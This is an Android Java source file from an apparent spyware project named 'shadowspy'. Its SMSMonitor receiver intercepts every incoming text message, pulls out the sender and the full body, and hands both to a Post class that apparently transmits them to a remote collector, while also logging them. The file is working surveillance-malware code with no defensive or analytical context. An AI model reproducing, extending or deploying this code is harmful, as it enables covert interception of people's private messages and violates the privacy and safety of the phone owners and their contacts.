package com.example.shadowspy;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSMonitor extends BroadcastReceiver {
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
	@SuppressLint("NewApi")
	@Override
	public void onReceive(final Context context, Intent intent) {
		if (intent != null && intent.getAction() != null &&
		        ACTION.compareToIgnoreCase(intent.getAction()) == 0) {
		    Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
		    
		    SmsMessage[] messages = new SmsMessage[pduArray.length];
		    for (int i = 0; i < pduArray.length; i++) {
		        messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
		    }
		
			final String sms_from = messages[0].getDisplayOriginatingAddress();	
			StringBuilder bodyText = new StringBuilder();
			for (int i = 0; i < messages.length; i++) {
				bodyText.append(messages[i].getMessageBody());
			}
			
			
			//-----------------------------------
			final String body = bodyText.toString();
			new Thread(new Runnable() {
			    public void run() {
			    	Post post = new Post(context);
			    	String message = "#" + sms_from + "#" + body;
					post.SendMessage(Codes.INCOME_SMS+message);
					Log.w("sms", message);
					//TODO
			    }
			}).start();
			//---------------------------------
		}
		
		
	}//onRecieve
}//class
